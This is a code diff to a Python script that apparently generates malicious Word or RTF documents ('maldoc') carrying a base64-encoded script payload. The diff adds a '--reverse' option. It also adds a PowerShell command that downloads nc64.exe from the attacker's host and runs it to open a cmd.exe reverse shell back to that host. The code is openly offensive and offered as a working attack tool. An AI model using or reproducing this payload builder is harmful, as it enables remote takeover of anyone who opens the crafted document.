@@ -38,12 +38,21 @@ if __name__ == '__main__':
         help="Filename for output, should end with extension .doc, .docx or maybe .rtf (defaults to maldoc.docx)",
     )
 
+    parser.add_argument(
+        "--reverse",
+        "-r",
+        type=int,
+        default="0",
+        help="Instantiate a reverse shell connection on the target at port furnished. 64-bits systems only.",
+    )
+
     args = parser.parse_args()
 
     print("[*] Creating maldoc...")
     command = args.command
     host = args.ip
     port = args.port
+    rport = args.reverse
     filename = args.output
 
     if not filename.split(".")[-1] in ["doc", "docx", "rtf"]:
@@ -73,6 +82,9 @@ if __name__ == '__main__':
     print("[*] Generating payload...")
     if not os.path.exists("www"):
         os.makedirs("www")
+
+    if rport:
+        command = f'Invoke-WebRequest http://{host}:{port}/nc64.exe -OutFile nc64.exe;.\\nc64.exe -e cmd.exe {host} {rport}'
 
     command = base64.b64encode(command.encode("utf-8")).decode("utf-8")
     payload = f"""<script>
